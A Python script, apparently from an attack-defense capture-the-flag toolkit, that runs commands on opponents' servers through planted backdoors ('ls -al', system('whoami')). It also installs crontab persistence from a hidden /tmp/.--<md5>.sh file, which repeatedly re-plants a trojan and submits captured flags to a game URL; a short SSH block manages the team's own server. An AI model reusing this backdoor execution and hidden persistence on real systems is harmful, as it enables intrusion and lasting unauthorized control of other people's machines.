
import Weapons
import Defends
import Tools
import Setting
def bckDoor(w):
    w.useBckDoorIndex=0 #使用哪个后门
    
    # print(backdoor.eachIp(w.trojTime))
    # print(backdoor.eachIpArgs(w.runCmd,'*.php'))
    print(backdoor.eachIpArgs(w.runCmd,'ls -al'))
    print(backdoor.eachIpArgs(w.runTeamCmd,'system(\'whoami\')'))
    
    print(backdoor.eachIpArgs(buildAndRunCrontabCmd,w))
def buildAndRunCrontabCmd(index,w):
    rawCrontabStr_autoSubmit=tools.buildCrontab('*',config.gameUrl,f'token={config.token}&flag=`date +\'%s\'`',1)
    rawCrontabStr_troj=tools.buildCrontab('*',w.team[index].trojContent,'',2)

    crontabStr,md5Str=tools.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
    w.runTeamCmd(index,f'system(\'{crontabStr}\')')
    return w.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')

if __name__ == "__main__":
    print('script start')
    config=Setting.Config('setting/Default.json')
    ssh=Defends.SSH(Defends.SSH.configStart(config[0]))
    ssh.connect()
    print(ssh.execCmd("ls -al").getResult())
    print(ssh.execCmd("cd /app").getResult())
    print(ssh.execCmd("ls -al").getResult())
    
    # ssh.backupserver()
    # #ssh.deploy('bck_20191013_151029.bck')
    # ssh.reDeploy()
    # ssh.disconnect()
    
    
    pass
